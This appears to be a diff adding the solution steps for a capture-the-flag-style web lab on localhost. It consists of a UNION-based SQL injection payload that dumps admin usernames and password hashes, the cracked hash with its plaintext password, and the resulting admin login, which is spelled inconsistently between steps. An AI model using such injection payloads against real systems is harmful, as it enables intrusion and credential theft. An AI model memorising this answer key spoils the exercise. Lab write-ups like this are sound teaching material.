@@ -1,0 +1,5 @@
+Solution steps:
+
+1) http://localhost:3000/players/2-P' UNION SELECT NULL, username, password, name from admins--
+2) decrypt irrip password with sha256 (b6f8ff77a4786fdb7ba734b39580c9655e30dad9b10599fb6129940a8355c7f1:doughnut)
+3) login to http://localhost:3000/administration (iripp:doughnut) 	
